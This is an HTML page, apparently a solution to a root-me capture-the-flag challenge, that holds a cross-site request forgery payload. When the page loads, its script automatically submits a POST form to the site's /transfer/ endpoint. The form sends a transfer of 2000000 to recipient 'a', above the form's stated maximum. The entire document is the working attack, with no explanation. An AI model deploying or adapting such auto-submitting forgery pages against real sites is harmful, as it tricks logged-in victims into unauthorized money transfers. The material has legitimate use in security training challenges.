<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire Automatique</title>
</head>
<body>
    <h1>Soumission Automatique de Formulaire</h1>

    <form id="transfer-form" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
        <div class="my-3">
            <label for="recipient" class="form-label">Recipient:</label>
            <input type="text" class="form-control" name="recipient" value="a">
            <label for="amount" class="form-label">Amount:</label>
            <input type="number" class="form-control" name="amount" min="0" max="1000000" value="2000000">
        </div>
        <button type="submit">Transfer</button>
    </form>

    <script>

        // Soumettre le formulaire automatiquement
        window.onload = function() {
            document.getElementById("transfer-form").submit();
        };
    </script>
</body>
</html>
